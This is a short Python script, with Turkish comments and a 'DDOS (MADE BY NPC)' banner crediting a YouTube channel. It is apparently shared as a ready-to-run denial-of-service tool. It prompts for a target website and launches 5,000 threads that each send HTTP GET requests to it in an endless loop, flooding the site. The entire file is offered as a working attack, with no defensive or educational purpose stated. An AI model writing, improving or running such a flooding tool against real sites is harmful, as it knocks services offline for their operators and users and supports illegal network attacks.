import os
import threading
import requests
import pyfiglet
from termcolor import colored

# Ekranı temizleme fonksiyonu
def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

# Ekranı temizle
clear_screen()

# Büyük ASCII "NPCSLAB" yazısı (Kırmızı)
ascii_banner = pyfiglet.figlet_format("DDOS (MADE BY NPC)")
print(colored(ascii_banner, 'blue'))

# Küçük kırmızı "Youtube: zted_or_npc" yazısı
print(colored("Youtube: zted_or_npc", 'blue'))

# Kullanıcıdan hedef siteyi al
target_url = input("\nHedef siteyi gir (http:// veya https:// ile): ")

# Aynı anda çalışacak istek sayısı
num_requests = 5000

def attack():
    while True:
        try:
            response = requests.get(target_url)
            print(f"ATTACKING USING BOT: {response.status_code}")
        except requests.exceptions.RequestException:
            print("SPAMMING REQUEST FROM YOUR PHONE")

# Thread’leri başlat
threads = []
for _ in range(num_requests):
    t = threading.Thread(target=attack)
    t.start()
    threads.append(t)

# Thread’lerin bitmesini bekle
for t in threads:
    t.join()
